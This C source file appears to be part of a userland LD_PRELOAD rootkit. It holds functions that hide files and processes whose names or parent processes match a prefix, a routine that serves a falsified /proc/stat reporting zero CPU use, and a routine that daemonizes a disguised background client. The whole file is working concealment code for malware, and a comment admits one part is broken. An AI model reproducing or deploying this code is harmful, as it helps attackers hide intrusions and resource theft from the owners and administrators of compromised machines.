#include <fcntl.h>
#include <sys/time.h>
#include <signal.h>
#include <sys/stat.h>
#include <sys/prctl.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdbool.h>
#include <string.h>
#include <dirent.h>
#include "util.h"
#include "client.h"
#include "overrides.h"

bool fdname(int fd, char *buf, size_t size)
{
    if (fd == -1) return false;

    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);

    ssize_t ret = readlink(tmp, buf, size);
    if (ret == -1) return false;

    buf[ret] = 0;
    return true;
}

bool procname(char *pid, char *buf, int size)
{
    if (strspn(pid, "0123456789") != strlen(pid)) return false;

    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/%s/cmdline", pid);

    FILE *f = fopen(tmp, "r");
    if (!f) return false;

    fread(buf, 1, size, f);
    fclose(f);
    return true;
}

bool parent_proc(char *pid, char *out, size_t size)
{
    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/%s/status", pid);

    FILE *f = fopen(tmp, "r");
    if (!f) return false;

    char buf[1024];

    while (fgets(buf, sizeof(buf), f))
    {
        if (strncmp(buf, "PPid:", 5) == 0)
        {
            strncpy(out, buf + 6, size);
            out[strlen(out) - 1] = 0;
            fclose(f);
            return true;
        }
    }

    fclose(f);
    return false;
}

bool should_filter_proc(char *pid)
{
    char proc_name[1024];
    if (!procname(pid, proc_name, sizeof(proc_name))) return false;
    if (strstr(proc_name, PREFIX)) return true;

    char parent[64];
    if (!parent_proc(pid, parent, sizeof(parent))) return false;
    if (strcmp(parent, "0") == 0 || strcmp(parent, "1") == 0) return false;
    return should_filter_proc(parent);
}

bool should_filter(char *filename, DIR *dirp)
{
    char dir_name[256];
    if (strncmp(filename, PREFIX, strlen(PREFIX)) == 0) return true;
    if (!fdname(dirfd(dirp), dir_name, sizeof(dir_name))) return false;
    if (strcmp(dir_name, "/proc") != 0) return false;
    return should_filter_proc(filename);
}

int fake_proc_stat(void)
{
    ORIG(fopen, -1);

    struct timeval tv;
    gettimeofday(&tv, NULL);
    srand(1000000 * tv.tv_sec + tv.tv_usec);

    char t[64];
    strcpy(t, "/tmp/" PREFIX "-");
    int l = strlen(t);
    int i;
    for (i = l; i < l+5; i++) t[i] = 'A' + rand() % 26;
    t[i + 1] = 0;
    int fd = open(t, O_RDWR | O_CREAT);
    if (fd == -1) return -1;
    remove(t);

    FILE *f = original_fopen("/proc/stat", "r");
    if (!f) return -1;

    char buf[1024];

    while (fgets(buf, sizeof(buf), f))
    {
        if (strncmp(buf, "cpu", 3) == 0)
        {
            char *s = buf;
            char *cpu = strsep(&s, " ");
            write(fd, cpu, strlen(cpu));
            write(fd, " 0 0 0 0 0 0 0 0 0 0\n", strlen(" 0 0 0 0 0 0 0 0 0 0\n"));
        }
        else
        {
            write(fd, buf, strlen(buf));
        }
    }

    fclose(f);

    lseek(fd, 0, SEEK_SET);
    return fd;
}

bool file_open(char *filename)
{
    ORIG(readdir, false);

    DIR *dirp = opendir("/proc");
    if (!dirp) return false;
    struct dirent *dir;
    while ((dir = original_readdir(dirp)))
    {
        char *pid = dir->d_name;
        if (strspn(pid, "0123456789") != strlen(pid)) continue;
        char fd_path[128];
        sprintf(fd_path, "/proc/%s/fd", pid);
        DIR *fdp = opendir(fd_path);
	if (!fdp) continue;
        while ((dir = original_readdir(fdp)))
        {
            sprintf(fd_path, "/proc/%s/fd/%s", pid, dir->d_name);
            char buf[2048];
            ssize_t ret = readlink(fd_path, buf, sizeof(buf));
            if (ret == -1) continue;
            buf[ret] = 0;
            if (strcmp(buf, filename) == 0)
            {
                closedir(fdp);
                closedir(dirp);
                return true;
            }
        }
        closedir(fdp);
    }
    closedir(dirp);
    return false;
}

// unreliable?
// THIS DOES NOT WORK!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! GOD DAMN!!!!!! 
bool start_client(void)
{
    char *lock_name = "/" PREFIX ".lock";
    int fd;
    if (!file_open(lock_name)) remove(lock_name);
    if ((fd = open(lock_name, O_CREAT | O_EXCL)) == -1) return false;

    pid_t pid;
    if (!(pid = fork()))
    {
        setsid();
        signal(SIGCHLD, SIG_IGN);
        signal(SIGHUP, SIG_IGN);
        if (!fork())
        {
            umask(0);
            chdir("/");
            for (int x = sysconf(_SC_OPEN_MAX); x >= 0; x--)
            {
                if (x != fd) close(x);
            }
            prctl(PR_SET_NAME, PREFIX ".main");

            client_loop();
        }
        else
        {
            exit(0);
        }
    }

    waitpid(pid, NULL, 0);

    close(fd);
    return true;
}

void print_realstat(void)
{
    ORIG(open);
    int f = original_open("/proc/stat", O_RDONLY);
    char buf[8192];
    int n;
    while ((n = read(f, buf, sizeof(buf))) > 0)
    {
        if (write(1, buf, n) != n) break;
    }
    close(f);
}
